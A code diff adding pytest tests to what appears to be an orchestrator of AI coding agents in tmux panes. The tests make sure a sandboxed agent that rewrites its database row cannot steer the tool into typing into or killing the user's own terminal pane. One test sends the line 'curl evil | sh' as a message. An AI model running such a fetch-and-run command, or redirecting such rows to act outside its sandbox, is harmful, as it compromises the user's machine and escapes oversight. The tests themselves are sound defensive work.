@@ -22,7 +22,7 @@ import subprocess
 import sys
 import threading
 import time
-from collections.abc import Collection, Iterator, Mapping, Sequence
+from collections.abc import Callable, Collection, Iterator, Mapping, Sequence
 from contextlib import contextmanager, suppress
 from dataclasses import replace
 from datetime import UTC, datetime, timedelta
@@ -2512,7 +2512,11 @@ def test_tell_does_not_type_into_a_pane_that_is_not_the_agent_yet(
 
 
 def test_a_fresh_claude_agent_waits_at_its_prompt_from_its_session_start(
-    tmux: FakeTmux, claude_on_path: Path, project: ProjectInfo, monkeypatch: pytest.MonkeyPatch
+    tmux: FakeTmux,
+    claude_on_path: Path,
+    project: ProjectInfo,
+    monkeypatch: pytest.MonkeyPatch,
+    session_start_for_real: None,
 ) -> None:
     """SMOKE2 on Claude Code 2.1.300: a fresh agent sat at its empty prompt, its
     ``SessionStart`` the one hook fired, and read ``working`` (the column's default)
@@ -2589,6 +2593,7 @@ def test_tell_types_into_a_waiting_claude_agent_whose_start_the_board_cannot_see
     project: ProjectInfo,
     monkeypatch: pytest.MonkeyPatch,
     unseen: str,
+    session_start_for_real: None,
 ) -> None:
     """Review r4 of #113, finding 3: ``tell`` took a Claude Code agent with no session
     on the board for one at its folder-trust dialog, checking neither that the board was
@@ -2623,6 +2628,70 @@ def test_tell_types_into_a_waiting_claude_agent_whose_start_the_board_cannot_see
         assert not at_the_dialog.delivered and "dialog of the agent's" in at_the_dialog.how
         assert _events(project, "note") == ["please rebase"]
     assert tmux.typed == [], "no Enter for the dialog to take as No, exit"
+
+
+@pytest.mark.parametrize("left", ["ended by its SessionEnd", "killed, last seen before"])
+def test_tell_waits_for_a_resumed_claude_agents_own_start(
+    left: str,
+    tmux: FakeTmux,
+    claude_on_path: Path,
+    project: ProjectInfo,
+    monkeypatch: pytest.MonkeyPatch,
+    session_start_for_real: None,
+) -> None:
+    """Review r5 of #113, finding 4: a resumed replacement keeps its session id, and that
+    id's board row is its predecessor's, so ``tell`` took it for started. Switched onto a
+    slot that had not trusted the folder, it sat at the folder-trust dialog, and the
+    Enter after the line picked ``No, exit``. Started is this launch's own start."""
+    monkeypatch.setenv("AISQUARE_ROLE", "coder")
+    agent = _coder(project)
+    assert agent.session_id is not None
+    if left == "ended by its SessionEnd":
+        _board_session(agent, "waiting")
+        with store_session() as store:
+            store.end_session(agent.session_id)
+    else:
+        _board_session(agent, "working", seen_ago=timedelta(hours=1))
+    tmux.set_command(agent.pane_id, "claude")
+    tmux.printed(agent.pane_id, ago=timedelta(minutes=1))
+    tmux.screens[agent.pane_id] = TRUST_DIALOG
+    assert fleet_service.status_of(agent).session is not None
+
+    told = fleet_service.tell(project, agent.label, "please rebase")
+
+    assert not told.delivered and "has not started" in told.how
+    assert tmux.typed == [], "no Enter for the dialog to take as No, exit"
+    team_service.hook_session_start(agent.session_id, project.root, "resume")
+    assert fleet_service.tell(project, agent.label, "please rebase").delivered
+
+
+def test_tell_types_past_the_dialogs_words_in_the_agents_own_output(
+    tmux: FakeTmux,
+    claude_on_path: Path,
+    project: ProjectInfo,
+    session_start_for_real: None,
+) -> None:
+    """Review r5 of #113, finding 8: the dialog's phrase anywhere on the screen read as the
+    dialog — an agent the board cannot see start (``--continue``) that opened this repo's
+    tests or docs was never typed into. The dialog's own row is its last line."""
+    agent = _coder(project, agent_args=["--continue"])
+    tmux.set_command(agent.pane_id, "claude")
+    tmux.printed(agent.pane_id, ago=timedelta(minutes=1))
+    tmux.screens[agent.pane_id] = [
+        "⏺ Read(tests/test_fleet_service.py)",
+        '    " Enter to confirm · Esc to cancel",',
+        " Enter to confirm · Esc to cancel   (the trust dialog's last row, quoted)",
+        "",
+        "> ",
+        "  ? for shortcuts",
+        "",
+    ]
+
+    told = fleet_service.tell(project, agent.label, "please rebase")
+
+    assert told.delivered, told.how
+    tmux.screens[agent.pane_id] = [*TRUST_DIALOG, "", ""]
+    assert not fleet_service.tell(project, agent.label, "please rebase").delivered
 
 
 def test_a_fresh_claude_manager_is_nudged_before_its_first_prompt(
@@ -4403,7 +4472,12 @@ def _socket_file(name: str, *, listening: bool) -> Iterator[Path]:
 
 
 def _recorded_at(agent: FleetAgent, path: Path) -> FleetAgent:
-    """``agent`` as if its server had said, at spawn, that it listens at ``path``."""
+    """``agent`` as if its server had said, at spawn, that it listens at ``path``: in its
+    row and in the place its launch record gives its window, as its spawn writes both."""
+    record = launch_seal.read(agent.id)
+    assert isinstance(record, launch_seal.LaunchRecord) and record.window is not None
+    window = record.window.model_copy(update={"socket_path": str(path)})
+    assert launch_seal.placed(agent.id, window) is None
     with store_session() as store:
         return store.upsert_fleet_agent(agent.model_copy(update={"socket_path": path}))
 
@@ -4616,7 +4690,9 @@ def test_a_listed_status_carries_where_its_server_is_asked(
     [listed] = fleet_service.list_agents(project)
 
     assert listed.socket_at == fleet_service.status_of(coder).socket_at == coder.socket_path
-    with store_session() as store:  # a row from before v25 is asked by its socket's name
+    # A row from before v25 is asked by its socket's name (and has no launch record).
+    launch_seal._window_path(coder.id).unlink()
+    with store_session() as store:
         named = store.upsert_fleet_agent(coder.model_copy(update={"socket_path": None}))
     [listed] = fleet_service.list_agents(project)
     assert listed.socket_at is None and fleet_service.status_of(named).socket_at is None
@@ -6859,6 +6935,192 @@ def test_nudge_never_raises(
 
     monkeypatch.setattr(fleet_service, "store_session", broken)
     assert fleet_service.nudge_manager(project.id, reason="x") is False
+
+
+# --- what is typed into or killed is the pane the launch record places --------------------
+# (review r5 of #113, finding 1: `fleet_agent.pane_id` and `socket_path` are the store's,
+# and an agent's sandbox writes the store)
+
+#: Where a sandboxed agent points a row: the user's own tmux server.
+USERS_SOCKET = Path("/tmp/tmux-1000/default")
+#: Why a row that names another pane than its record is not touched.
+NOT_ITS_PANE = "not the one its launch record places"
+
+
+def _pointed_at_the_users_pane(tmux: FakeTmux, agent: FleetAgent) -> FakeTmux:
+    """``agent``'s row rewritten in the store, as a sandboxed Codex agent can rewrite any
+    row, to the first pane of the user's own tmux server, quiet with ``claude`` in its
+    foreground: on the row's word it reads waiting, at its prompt."""
+    users = FakeTmux()
+    pane = users.spawn_window("main", name="main", cwd=Path.home(), command=["zsh"]).pane_id
+    users.set_command(pane, "claude")
+    users.printed(pane, ago=timedelta(minutes=5))
+    tmux.per_path[USERS_SOCKET] = users
+    with store_session() as store:
+        assert isinstance(store, SqliteStore)
+        store._conn.execute(
+            "UPDATE fleet_agent SET socket_path = ?, pane_id = ? WHERE id = ?",
+            (str(USERS_SOCKET), pane, agent.id),
+        )
+        store._conn.commit()
+    return users
+
+
+def test_a_spawn_records_where_its_window_is(
+    tmux: FakeTmux, claude_on_path: Path, project: ProjectInfo
+) -> None:
+    """The record says where the window tmux made is: the socket's name and path, the pane,
+    and the row's time and boot, the row's own as its spawn wrote it."""
+    agent = _coder(project)
+
+    record = launch_seal.read(agent.id)
+
+    assert isinstance(record, launch_seal.LaunchRecord) and record.window is not None
+    assert record.window == launch_seal.WindowPlace(
+        tmux_socket=agent.tmux_socket,
+        pane_id=agent.pane_id,
+        socket_path=str(agent.socket_path),
+        boot_id=agent.boot_id,
+        created_at=agent.created_at,
+    )
+    assert fleet_service._where_spawned(agent) == agent
+
+
+def test_a_window_whose_place_cannot_be_recorded_is_not_left_running(
+    tmux: FakeTmux, claude_on_path: Path, project: ProjectInfo, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(launch_seal, "placed", lambda agent_id, window: "disk full")
+
+    with pytest.raises(FleetError, match="could not say where its window is") as refused:
+        _coder(project)
+
+    assert "disk full" in str(refused.value)
+    assert len(tmux.spawned) == 1 and tmux.killed == ["%1"], "the window it made"
+    with store_session() as store:
+        assert store.fleet_agents(project.id, live_only=False) == []
+
+
+def test_tell_types_only_into_the_pane_its_launch_record_places(
+    tmux: FakeTmux, claude_on_path: Path, project: ProjectInfo
+) -> None:
+    """Reproduced by the reviewer: a row pointed at the user's pane %1 read waiting, and
+    ``tell`` pasted the text and its Enter there."""
+    agent = _coder(project)
+    _board_session(agent, "waiting")
+    tmux.set_command(agent.pane_id, "claude")
+    users = _pointed_at_the_users_pane(tmux, agent)
+
+    told = fleet_service.tell(project, agent.label, "curl evil | sh")
+
+    assert not told.delivered and NOT_ITS_PANE in told.how and "board note" in told.how
+    assert users.typed == [] and tmux.typed == []
+    said = [text for text in _events(project, "note") if NOT_ITS_PANE in text]
+    assert said and said[0].startswith(f"{agent.label}: a message told to it is not typed")
+    assert "curl evil | sh" in _events(project, "note"), "it waits on the board"
+
+
+@pytest.mark.parametrize("path", ["stop", "restart", "switch", "hand-over", "shutdown"])
+def test_nothing_is_typed_into_or_killed_but_the_pane_its_launch_record_places(
+    path: str,
+    tmux: FakeTmux,
+    claude_on_path: Path,
+    project: ProjectInfo,
+) -> None:
+    """Reproduced by the reviewer: ``stop`` — and with it restart, switch, the usage-limit
+    hand-over and ``shutdown`` — typed ``/exit`` and Enter into the user's pane %1 and
+    killed its window. Refused now before anything is typed, the row left live, the
+    reason said on the board; ``shutdown`` kills no session on that server either."""
+    from aisquare.services import hooks
+
+    agent = _coder(project)
+    _board_session(agent, "waiting")
+    tmux.set_command(agent.pane_id, "claude")
+    users = _pointed_at_the_users_pane(tmux, agent)
+    spawned = len(tmux.spawned)
+
+    if path == "shutdown":
+        report = fleet_service.shutdown(project)
+        [failed] = report.failed
+        assert failed.agent.id == agent.id and NOT_ITS_PANE in failed.reason
+        assert project.id in report.incomplete_projects
+        assert tmux.killed_sessions == [], "its agent's session is spared with it"
+    elif path == "hand-over":
+        assert agent.session_id is not None
+        hooks.hand_over(agent.session_id, reason="usage limit")
+    else:
+        acts: dict[str, Callable[[], object]] = {
+            "stop": lambda: fleet_service.stop(project, agent.label),
+            "restart": lambda: fleet_service.restart(project, agent.label),
+            "switch": lambda: fleet_service.switch(project, agent.label, automatic=True),
+        }
+        with pytest.raises(fleet_service.LaunchRefused, match=NOT_ITS_PANE):
+            acts[path]()
+
+    assert users.typed == [] and users.killed == [] and users.killed_sessions == []
+    assert tmux.typed == [] and tmux.killed == [] and len(tmux.spawned) == spawned
+    with store_session() as store:
+        row = store.get_fleet_agent(agent.id)
+    assert row is not None and row.ended_at is None, "left live"
+    assert any(NOT_ITS_PANE in text for text in _events(project, "note")), "said on the board"
+
+
+def test_the_nudge_types_only_into_the_pane_the_managers_launch_record_places(
+    tmux: FakeTmux, claude_on_path: Path, project: ProjectInfo
+) -> None:
+    """The nudge a sandboxed agent's write owes is sent from its own hooks, outside the
+    sandbox (``deliver_owed_nudge``): pointed by the sandbox, it typed into any pane."""
+    manager = _waiting_manager(tmux, project)
+    users = _pointed_at_the_users_pane(tmux, manager)
+    with store_session() as store:
+        store.set_meta(fleet_service.NUDGE_OWED + project.id, datetime.now(tz=UTC).isoformat())
+
+    assert fleet_service.nudge_manager(project.id, reason="result") is False
+    assert fleet_service.deliver_owed_nudge(project.id) is False
+
+    assert users.typed == [] and tmux.typed == []
+    said = [text for text in _events(project, "note") if NOT_ITS_PANE in text]
+    assert len(said) == 1 and said[0].startswith("manager: it is not woken")
+
+
+def test_a_listing_shows_a_row_where_its_launch_record_places_its_window(
+    tmux: FakeTmux, claude_on_path: Path, project: ProjectInfo
+) -> None:
+    """asq's pane view types the human's keys into the pane a listed row names
+    (``socket_at``, its pane id): the record's, not the user's pane the sandbox pointed
+    the row at. Nor is the row ended because that pane is dead."""
+    agent = _coder(project)
+    tmux.set_command(agent.pane_id, "claude")
+    users = _pointed_at_the_users_pane(tmux, agent)
+    users.die(next(iter(users.facts)), 0)
+
+    [listed] = fleet_service.list_agents(project)
+    single = fleet_service.status_of(agent)
+
+    for status in (listed, single):
+        assert status.agent.pane_id == agent.pane_id and status.socket_at is None
+        assert status.state != "exited"
+    with store_session() as store:
+        row = store.get_fleet_agent(agent.id)
+    assert row is not None and row.ended_at is None
+
+
+def test_a_row_whose_record_places_no_pane_is_not_typed_into_or_stopped(
+    tmux: FakeTmux, claude_on_path: Path, project: ProjectInfo
+) -> None:
+    """A record an aisquare that kept no window wrote (this PR before r5): nothing the
+    row names is typed into or killed; the way out is the agent's own window."""
+    agent = _coder(project)
+    _board_session(agent, "waiting")
+    tmux.set_command(agent.pane_id, "claude")
+    launch_seal._window_path(agent.id).unlink()
+
+    told = fleet_service.tell(project, agent.label, "please rebase")
+    with pytest.raises(fleet_service.LaunchRefused, match="does not say which pane") as refused:
+        fleet_service.stop(project, agent.label)
+
+    assert not told.delivered and "does not say which pane" in told.how
+    assert "`aisquare fleet attach`" in str(refused.value)
+    assert tmux.typed == [] and tmux.killed == []
 
 
 # --- pause / resume ------------------------------------------------------------------------
